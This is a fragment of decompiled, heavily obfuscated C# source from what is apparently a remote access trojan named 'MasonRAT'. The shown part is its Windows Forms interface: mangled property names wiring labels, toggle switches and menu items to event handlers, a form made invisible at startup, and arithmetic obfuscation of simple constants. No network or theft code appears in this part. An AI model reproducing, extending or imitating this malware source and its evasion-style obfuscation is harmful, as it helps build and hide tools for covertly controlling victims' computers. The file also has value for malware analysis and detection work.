  internal virtual Label \u2694️MasonRAT\u270Cؤـ\u060Aٺ\u060Bْ\u0609ٺـ\u0608ـٺ\u060Fــ
  {
    get => this.\u2694️MasonRAT\u270C\u0609گ\u060A\u060Cۙدڙـۡڞ\u0608\u0608ىـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608̍ــٽ\u060Bـ\u060A\u0609ح\u060Dۛڠۙڝڟ\u060Eڠ\u060A\u060A);
      Label masonRatگۙدڙـۡڞىـ1 = this.\u2694️MasonRAT\u270C\u0609گ\u060A\u060Cۙدڙـۡڞ\u0608\u0608ىـ;
      if (masonRatگۙدڙـۡڞىـ1 != null)
        masonRatگۙدڙـۡڞىـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609گ\u060A\u060Cۙدڙـۡڞ\u0608\u0608ىـ = value;
      Label masonRatگۙدڙـۡڞىـ2 = this.\u2694️MasonRAT\u270C\u0609گ\u060A\u060Cۙدڙـۡڞ\u0608\u0608ىـ;
      if (masonRatگۙدڙـۡڞىـ2 == null)
        return;
      masonRatگۙدڙـۡڞىـ2.Click += eventHandler;
    }
  }

  internal virtual PictureBox \u2694️MasonRAT\u270Cٽ\u060Fڙـ\u060Eْ\u0609ــــ̍\u0608\u060F\u0609\u060Aڙ\u060Aـ
  {
    get
    {
      return this.\u2694️MasonRAT\u270C\u060Aڙ\u060Fۙ\u0608ـ\u060E\u060A\u0609ٽـ\u0609\u0609بۚۚـ\u060E;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dڙٺڙـ\u060Bــڅ\u060A);
      PictureBox masonRatڙۙـٽـبۚۚـ1 = this.\u2694️MasonRAT\u270C\u060Aڙ\u060Fۙ\u0608ـ\u060E\u060A\u0609ٽـ\u0609\u0609بۚۚـ\u060E;
      if (masonRatڙۙـٽـبۚۚـ1 != null)
        masonRatڙۙـٽـبۚۚـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Aڙ\u060Fۙ\u0608ـ\u060E\u060A\u0609ٽـ\u0609\u0609بۚۚـ\u060E = value;
      PictureBox masonRatڙۙـٽـبۚۚـ2 = this.\u2694️MasonRAT\u270C\u060Aڙ\u060Fۙ\u0608ـ\u060E\u060A\u0609ٽـ\u0609\u0609بۚۚـ\u060E;
      if (masonRatڙۙـٽـبۚۚـ2 == null)
        return;
      masonRatڙۙـٽـبۚۚـ2.Click += eventHandler;
    }
  }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270Cٽـڅـڦ\u0609ﯧد\u060F\u060Bــۙـٺ\u060Bاـ
  {
    get
    {
      return this.\u2694️MasonRAT\u270C\u060Aمۙ\u060Bڠـ\u060Aۨـּ\u060C\u0608ـ\u0608ـط\u0608\u060D\u060B;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cٻ\u0609ۭڣۡ\u060Eــــ\u0608\u060Bـڝٸڇــ);
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٺڠۙﻼڙـ\u060Bۏڇ\u0609ـٸﻻد\u060Fڞ\u060Bؤ);
      Guna2ToggleSwitch masonRatمۙڠـۨـּــط1 = this.\u2694️MasonRAT\u270C\u060Aمۙ\u060Bڠـ\u060Aۨـּ\u060C\u0608ـ\u0608ـط\u0608\u060D\u060B;
      if (masonRatمۙڠـۨـּــط1 != null)
      {
        masonRatمۙڠـۨـּــط1.MouseClick -= mouseEventHandler;
        masonRatمۙڠـۨـּــط1.CheckedChanged -= eventHandler;
      }
      this.\u2694️MasonRAT\u270C\u060Aمۙ\u060Bڠـ\u060Aۨـּ\u060C\u0608ـ\u0608ـط\u0608\u060D\u060B = value;
      Guna2ToggleSwitch masonRatمۙڠـۨـּــط2 = this.\u2694️MasonRAT\u270C\u060Aمۙ\u060Bڠـ\u060Aۨـּ\u060C\u0608ـ\u0608ـط\u0608\u060D\u060B;
      if (masonRatمۙڠـۨـּــط2 == null)
        return;
      masonRatمۙڠـۨـּــط2.MouseClick += mouseEventHandler;
      masonRatمۙڠـۨـּــط2.CheckedChanged += eventHandler;
    }
  }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270C\u060Aـ\u060Aـ\u0608ڙڇۙڦ\u060Fٻڟ\u0608
  {
    get => this.\u2694️MasonRAT\u270Cۛــ\u0608ۙڞـ\u060Dڙ\u0609حـ\u0608ټڙڙ\u060F\u060E̍;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cـ\u0608ـ\u060Aـب\u060Aۏـ\u0609\u060Aؤح\u060Aـڙ);
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـــټــ\u060D\u060B\u060D̍\u0609ۚـ);
      Guna2ToggleSwitch ratۛــۙڞـڙحـټڙڙ̍1 = this.\u2694️MasonRAT\u270Cۛــ\u0608ۙڞـ\u060Dڙ\u0609حـ\u0608ټڙڙ\u060F\u060E̍;
      if (ratۛــۙڞـڙحـټڙڙ̍1 != null)
      {
        ratۛــۙڞـڙحـټڙڙ̍1.MouseClick -= mouseEventHandler;
        ratۛــۙڞـڙحـټڙڙ̍1.CheckedChanged -= eventHandler;
      }
      this.\u2694️MasonRAT\u270Cۛــ\u0608ۙڞـ\u060Dڙ\u0609حـ\u0608ټڙڙ\u060F\u060E̍ = value;
      Guna2ToggleSwitch ratۛــۙڞـڙحـټڙڙ̍2 = this.\u2694️MasonRAT\u270Cۛــ\u0608ۙڞـ\u060Dڙ\u0609حـ\u0608ټڙڙ\u060F\u060E̍;
      if (ratۛــۙڞـڙحـټڙڙ̍2 == null)
        return;
      ratۛــۙڞـڙحـټڙڙ̍2.MouseClick += mouseEventHandler;
      ratۛــۙڞـڙحـټڙڙ̍2.CheckedChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Label18")]
  internal virtual Label \u2694️MasonRAT\u270Cﻻۨ\u0609ـﻻڙڙ\u060B\u060Aـ\u060D\u060D\u060Ąـﻋٻڦـﻻ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E
  {
    get => this.\u2694️MasonRAT\u270Cۙ\u060D\u0608ـ\u060Eـۡ\u0608\u060B\u0609ﻼـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cڙؤﻻـٻڙـىـــ\u060F\u0609);
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cد\u0608̍ـ\u060Aڙ\u0609ـد\u060Dـﻼح\u0609ـڙـ\u0608\u060F\u0608);
      Guna2ToggleSwitch guna2ToggleSwitch1 = this.\u2694️MasonRAT\u270Cۙ\u060D\u0608ـ\u060Eـۡ\u0608\u060B\u0609ﻼـ;
      if (guna2ToggleSwitch1 != null)
      {
        guna2ToggleSwitch1.MouseClick -= mouseEventHandler;
        guna2ToggleSwitch1.CheckedChanged -= eventHandler;
      }
      this.\u2694️MasonRAT\u270Cۙ\u060D\u0608ـ\u060Eـۡ\u0608\u060B\u0609ﻼـ = value;
      Guna2ToggleSwitch guna2ToggleSwitch2 = this.\u2694️MasonRAT\u270Cۙ\u060D\u0608ـ\u060Eـۡ\u0608\u060B\u0609ﻼـ;
      if (guna2ToggleSwitch2 == null)
        return;
      guna2ToggleSwitch2.MouseClick += mouseEventHandler;
      guna2ToggleSwitch2.CheckedChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Label19")]
  internal virtual Label \u2694️MasonRAT\u270C\u060Bٺ\u060Aۭڙ\u0608څــ\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label20")]
  internal virtual Label \u2694️MasonRAT\u270Cۧـ\u060Aـٸ\u0609ڙــۧ\u060Dـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270C\u060Aٺۭ̍ﻻ\u060Dڕـژــڞـٺـٸڟ
  {
    get => this.\u2694️MasonRAT\u270Cــــؤ\u0609\u060A\u060A\u0608ۧ\u060C\u060Dـڣۡ\u060Bڣ\u060Aٺۏ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـڙـ\u060Aـ\u060Dـٺئ\u0609);
      Label masonRatــــؤۧـڣۡڣٺۏ1 = this.\u2694️MasonRAT\u270Cــــؤ\u0609\u060A\u060A\u0608ۧ\u060C\u060Dـڣۡ\u060Bڣ\u060Aٺۏ;
      if (masonRatــــؤۧـڣۡڣٺۏ1 != null)
        masonRatــــؤۧـڣۡڣٺۏ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــــؤ\u0609\u060A\u060A\u0608ۧ\u060C\u060Dـڣۡ\u060Bڣ\u060Aٺۏ = value;
      Label masonRatــــؤۧـڣۡڣٺۏ2 = this.\u2694️MasonRAT\u270Cــــؤ\u0609\u060A\u060A\u0608ۧ\u060C\u060Dـڣۡ\u060Bڣ\u060Aٺۏ;
      if (masonRatــــؤۧـڣۡڣٺۏ2 == null)
        return;
      masonRatــــؤۧـڣۡڣٺۏ2.Click += eventHandler;
    }
  }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270Cٽـټ\u060A\u0020ٸـ\u060E\u0608ـۡــ̍\u060D
  {
    get => this.\u2694️MasonRAT\u270C\u060Bـڦٺـ\u0608ـ\u060Fۙ\u060Aڙــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0609\u060Dڣٺـڙ\u0608\u0609\u060C\u060Aټـ\u0609ــ\u060D);
      Guna2ToggleSwitch masonRatـڦٺــۙڙــ1 = this.\u2694️MasonRAT\u270C\u060Bـڦٺـ\u0608ـ\u060Fۙ\u060Aڙــ;
      if (masonRatـڦٺــۙڙــ1 != null)
        masonRatـڦٺــۙڙــ1.CheckedChanged -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Bـڦٺـ\u0608ـ\u060Fۙ\u060Aڙــ = value;
      Guna2ToggleSwitch masonRatـڦٺــۙڙــ2 = this.\u2694️MasonRAT\u270C\u060Bـڦٺـ\u0608ـ\u060Fۙ\u060Aڙــ;
      if (masonRatـڦٺــۙڙــ2 == null)
        return;
      masonRatـڦٺــۙڙــ2.CheckedChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Label22")]
  internal virtual Label \u2694️MasonRAT\u270Cـ\u060Dـּٸۜ\u060Aۙ\u0609\u0608ـ\u060B̍ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270Cٺڣٺ\u060Fٺ\u0609̍\u060B\u060Eۨ\u060Dڕ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u0609ڙ\u0608ۨ\u060B̍ـــ\u060Bةـ\u060Bٺ\u0609ــ\u060E;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﻋ\u060Aڠ\u0608\u060Bــۙ\u0609ـح);
      Guna2ToggleSwitch masonRatـڙۨ̍ـــةـٺــ1 = this.\u2694️MasonRAT\u270Cـ\u0609ڙ\u0608ۨ\u060B̍ـــ\u060Bةـ\u060Bٺ\u0609ــ\u060E;
      if (masonRatـڙۨ̍ـــةـٺــ1 != null)
        masonRatـڙۨ̍ـــةـٺــ1.CheckedChanged -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u0609ڙ\u0608ۨ\u060B̍ـــ\u060Bةـ\u060Bٺ\u0609ــ\u060E = value;
      Guna2ToggleSwitch masonRatـڙۨ̍ـــةـٺــ2 = this.\u2694️MasonRAT\u270Cـ\u0609ڙ\u0608ۨ\u060B̍ـــ\u060Bةـ\u060Bٺ\u0609ــ\u060E;
      if (masonRatـڙۨ̍ـــةـٺــ2 == null)
        return;
      masonRatـڙۨ̍ـــةـٺــ2.CheckedChanged += eventHandler;
    }
  }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270Cـ̍ﮪ\u060Cـ\u060B\u0608ــ\u0609\u0609ۙ̍\u060B\u0609\u0609دة
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Aدءﻋﻼـ\u0608̍ڙ̍ۛ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cء\u0608ڛٻ\u0609\u060Aــٺ̍\u0609ٺـؤؤبٽ\u060B\u060B\u0609);
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cـ\u060D\u060D\u060Aب\u060Eـ\u060Dــ\u060Dم\u0609\u060Aڇـــط);
      Guna2ToggleSwitch masonRatـدءﻋﻼـ̍ڙ̍ۛ1 = this.\u2694️MasonRAT\u270Cـ\u060Aدءﻋﻼـ\u0608̍ڙ̍ۛ;
      if (masonRatـدءﻋﻼـ̍ڙ̍ۛ1 != null)
      {
        masonRatـدءﻋﻼـ̍ڙ̍ۛ1.CheckedChanged -= eventHandler;
        masonRatـدءﻋﻼـ̍ڙ̍ۛ1.MouseClick -= mouseEventHandler;
      }
      this.\u2694️MasonRAT\u270Cـ\u060Aدءﻋﻼـ\u0608̍ڙ̍ۛ = value;
      Guna2ToggleSwitch masonRatـدءﻋﻼـ̍ڙ̍ۛ2 = this.\u2694️MasonRAT\u270Cـ\u060Aدءﻋﻼـ\u0608̍ڙ̍ۛ;
      if (masonRatـدءﻋﻼـ̍ڙ̍ۛ2 == null)
        return;
      masonRatـدءﻋﻼـ̍ڙ̍ۛ2.CheckedChanged += eventHandler;
      masonRatـدءﻋﻼـ̍ڙ̍ۛ2.MouseClick += mouseEventHandler;
    }
  }

  [field: AccessedThroughProperty("Label23")]
  internal virtual Label \u2694️MasonRAT\u270Cـ\u060Cــــ\u0020ٽڜـ\u060C̨ﯧ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label24")]
  internal virtual Label \u2694️MasonRAT\u270Cـٸ\u060Bڼ\u0608ـ\u060Bْـٸڇ\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270C\u0608\u060Cـحڠٺ\u060A\u060Aـٺ\u060Aڙح\u0609ؤ
  {
    get => this.\u2694️MasonRAT\u270C\u060Bــحٽٺ\u060Fْ̍څْژﻻ̍ٸﻋئ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٺـۙۚۡ\u060E\u0609\u060D\u060Eئـڙ\u0609\u0608\u060D\u060Fماۡ);
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cـڠـ\u060D\u0608\u0609ڟڟبح\u060D);
      Guna2ToggleSwitch ratــحٽٺْ̍څْژﻻ̍ٸﻋئ1 = this.\u2694️MasonRAT\u270C\u060Bــحٽٺ\u060Fْ̍څْژﻻ̍ٸﻋئ;
      if (ratــحٽٺْ̍څْژﻻ̍ٸﻋئ1 != null)
      {
        ratــحٽٺْ̍څْژﻻ̍ٸﻋئ1.CheckedChanged -= eventHandler;
        ratــحٽٺْ̍څْژﻻ̍ٸﻋئ1.MouseClick -= mouseEventHandler;
      }
      this.\u2694️MasonRAT\u270C\u060Bــحٽٺ\u060Fْ̍څْژﻻ̍ٸﻋئ = value;
      Guna2ToggleSwitch ratــحٽٺْ̍څْژﻻ̍ٸﻋئ2 = this.\u2694️MasonRAT\u270C\u060Bــحٽٺ\u060Fْ̍څْژﻻ̍ٸﻋئ;
      if (ratــحٽٺْ̍څْژﻻ̍ٸﻋئ2 == null)
        return;
      ratــحٽٺْ̍څْژﻻ̍ٸﻋئ2.CheckedChanged += eventHandler;
      ratــحٽٺْ̍څْژﻻ̍ٸﻋئ2.MouseClick += mouseEventHandler;
    }
  }

  [field: AccessedThroughProperty("Label25")]
  internal virtual Label \u2694️MasonRAT\u270Cڙٻ\u060Fــ\u0608ڙ\u0609ــ\u0609ـټڙـڙ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label26")]
  internal virtual Label \u2694️MasonRAT\u270C\u060Aؤحـــٺۙڙ\u060Bـۛـۙ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2ToggleSwitch \u2694️MasonRAT\u270Cٽ\u060Aژ\u060Aڝٺ\u060A\u0608ۙـ\u060Aۏٸــۧ\u0609\u0609
  {
    get => this.\u2694️MasonRAT\u270Cــ\u0609ءٺٺ\u060Bحؤ\u060Eڅڙىٺٸ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cـــ\u060Cــــ\u060Fڠּـ\u0608ڠ\u0608ٺ);
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڣ\u060Aةﮪةـــ\u060A\u060Aڙ);
      Guna2ToggleSwitch masonRatــءٺٺحؤڅڙىٺٸ1 = this.\u2694️MasonRAT\u270Cــ\u0609ءٺٺ\u060Bحؤ\u060Eڅڙىٺٸ;
      if (masonRatــءٺٺحؤڅڙىٺٸ1 != null)
      {
        masonRatــءٺٺحؤڅڙىٺٸ1.MouseClick -= mouseEventHandler;
        masonRatــءٺٺحؤڅڙىٺٸ1.CheckedChanged -= eventHandler;
      }
      this.\u2694️MasonRAT\u270Cــ\u0609ءٺٺ\u060Bحؤ\u060Eڅڙىٺٸ = value;
      Guna2ToggleSwitch masonRatــءٺٺحؤڅڙىٺٸ2 = this.\u2694️MasonRAT\u270Cــ\u0609ءٺٺ\u060Bحؤ\u060Eڅڙىٺٸ;
      if (masonRatــءٺٺحؤڅڙىٺٸ2 == null)
        return;
      masonRatــءٺٺحؤڅڙىٺٸ2.MouseClick += mouseEventHandler;
      masonRatــءٺٺحؤڅڙىٺٸ2.CheckedChanged += eventHandler;
    }
  }

  internal virtual Label \u2694️MasonRAT\u270Cد\u060D\u060Dۏــ\u060D؁ﻋ\u060Bدـ\u0609\u0609\u0609\u0608
  {
    get => this.\u2694️MasonRAT\u270Cـڙ\u0609ڛـ̍ۛ\u060Aٸـةم;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﯧد\u060Dـۧء\u0020\u060Aـٺ\u0020ڇؤڙ\u060Aٸ);
      Label masonRatـڙڛـ̍ۛٸـةم1 = this.\u2694️MasonRAT\u270Cـڙ\u0609ڛـ̍ۛ\u060Aٸـةم;
      if (masonRatـڙڛـ̍ۛٸـةم1 != null)
        masonRatـڙڛـ̍ۛٸـةم1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙ\u0609ڛـ̍ۛ\u060Aٸـةم = value;
      Label masonRatـڙڛـ̍ۛٸـةم2 = this.\u2694️MasonRAT\u270Cـڙ\u0609ڛـ̍ۛ\u060Aٸـةم;
      if (masonRatـڙڛـ̍ۛٸـةم2 == null)
        return;
      masonRatـڙڛـ̍ۛٸـةم2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﮪـڟـﻻـژــڙ\u0609\u060Aـٸـۭڙٸـ\u0608
  {
    get => this.\u2694️MasonRAT\u270C\u060Eــ\u0020ۡ\u060Aٸټـﻼﻋ\u060F\u0609ۨ\u0608ۛ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dٸۙ\u060Dـۭد\u0608\u060Fۧ\u0609\u0608\u0609ـ);
      ToolStripMenuItem masonRatــۡٸټـﻼﻋۨۛ1 = this.\u2694️MasonRAT\u270C\u060Eــ\u0020ۡ\u060Aٸټـﻼﻋ\u060F\u0609ۨ\u0608ۛ;
      if (masonRatــۡٸټـﻼﻋۨۛ1 != null)
        masonRatــۡٸټـﻼﻋۨۛ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Eــ\u0020ۡ\u060Aٸټـﻼﻋ\u060F\u0609ۨ\u0608ۛ = value;
      ToolStripMenuItem masonRatــۡٸټـﻼﻋۨۛ2 = this.\u2694️MasonRAT\u270C\u060Eــ\u0020ۡ\u060Aٸټـﻼﻋ\u060F\u0609ۨ\u0608ۛ;
      if (masonRatــۡٸټـﻼﻋۨۛ2 == null)
        return;
      masonRatــۡٸټـﻼﻋۨۛ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــ\u060Dۧبټد\u0609\u0609\u0020ژم
  {
    get => this.\u2694️MasonRAT\u270C\u060Aحڅټ\u0608ــۚ\u060Aحـ\u0608ـﻋدﮪٽڙڕـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڛﯧ̍\u0609ـ\u060E\u060Cـژ؁ڜٽڙـ\u060Dـﻋةﮪ);
      ToolStripMenuItem حڅټــۚحــﻋدﮪٽڙڕـ1 = this.\u2694️MasonRAT\u270C\u060Aحڅټ\u0608ــۚ\u060Aحـ\u0608ـﻋدﮪٽڙڕـ;
      if (حڅټــۚحــﻋدﮪٽڙڕـ1 != null)
        حڅټــۚحــﻋدﮪٽڙڕـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Aحڅټ\u0608ــۚ\u060Aحـ\u0608ـﻋدﮪٽڙڕـ = value;
      ToolStripMenuItem حڅټــۚحــﻋدﮪٽڙڕـ2 = this.\u2694️MasonRAT\u270C\u060Aحڅټ\u0608ــۚ\u060Aحـ\u0608ـﻋدﮪٽڙڕـ;
      if (حڅټــۚحــﻋدﮪٽڙڕـ2 == null)
        return;
      حڅټــۚحــﻋدﮪٽڙڕـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٽـۡڟـطۧـ\u0608ۚـټژ
  {
    get => this.\u2694️MasonRAT\u270Cٽ\u060Dؤـ\u060Bدﻼــ\u060Aۧـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٸـڇۧڇ̍حـٺٽﻋ\u0020̍ـ\u060Fـ\u060D);
      ToolStripMenuItem masonRatٽؤـدﻼــۧـ1 = this.\u2694️MasonRAT\u270Cٽ\u060Dؤـ\u060Bدﻼــ\u060Aۧـ;
      if (masonRatٽؤـدﻼــۧـ1 != null)
        masonRatٽؤـدﻼــۧـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cٽ\u060Dؤـ\u060Bدﻼــ\u060Aۧـ = value;
      ToolStripMenuItem masonRatٽؤـدﻼــۧـ2 = this.\u2694️MasonRAT\u270Cٽ\u060Dؤـ\u060Bدﻼــ\u060Aۧـ;
      if (masonRatٽؤـدﻼــۧـ2 == null)
        return;
      masonRatٽؤـدﻼــۧـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2ShadowForm1")]
  internal virtual Guna2ShadowForm \u2694️MasonRAT\u270Cــ\u060Aۧئ\u0608̨\u060Bڙى\u060B\u060Aىټ\u060D\u060E\u060Aٻـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  public Form1()
  {
    this.Load += new EventHandler(this.\u2694️MasonRAT\u270C̍ـ\u0608ۙۡٺْ\u0609\u060D\u060D\u060Aـڙـﮪـ\u060Cۡ);
    this.Closing += new CancelEventHandler(this.\u2694️MasonRAT\u270Cطۏڞﻻـ\u0609\u060Aۡ\u060Dگ\u060Bـ);
    this.FormClosing += new FormClosingEventHandler(this.\u2694️MasonRAT\u270Cـڙﯧـ\u060Fـــح̍ۧڙـﯧ);
    this.Activated += new EventHandler(this.\u2694️MasonRAT\u270Cـۧۙ\u060Cدۡۧـــ\u0609\u060Eۭ);
    this.Deactivate += new EventHandler(this.\u2694️MasonRAT\u270C̍ىىؤټـۙٻـئ\u060Dطﻋ\u060A);
    this.\u2694️MasonRAT\u270Cمڣمٻدــ\u060A\u0609ـ = false;
    this.\u2694️MasonRAT\u270Cــ\u0020\u060A\u0608\u060A\u0608ـ\u060C\u0608\u0608څـٽڙ();
    this.Opacity = 0.0;
    Helper.\u2694️MasonRAT\u270Cـڙـ\u0609ٺﻼ̍ــۜ؁ٸڝـ\u0609ـ((Form) this, 832332667 - 832332436 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - ((12840347 | 800125522) - 360070585 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 >> ((-887539992 ^ ~1783474370) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
  }

  private void \u2694️MasonRAT\u270C̍ـ\u0608ۙۡٺْ\u0609\u060D\u060D\u060Aـڙـﮪـ\u060Cۡ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cـــۚۙب\u0020ڙؤڙﻋ.Start();
    this.\u2694️MasonRAT\u270Cـٺ\u060E\u0609\u060A\u060Bـ\u060A\u060C\u060Bۧط\u060Aڙ.PerformClick();
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[1].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[1943126637 - -776355223 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + (354227854 - (991708053 << 1485874316) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 | 925703295 - 432562435 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Columns[((2127404297 > 1418450811 ? -1215834482 : -1621112642) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + ((1215834464 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)].TextAlign = HorizontalAlignment.Left;
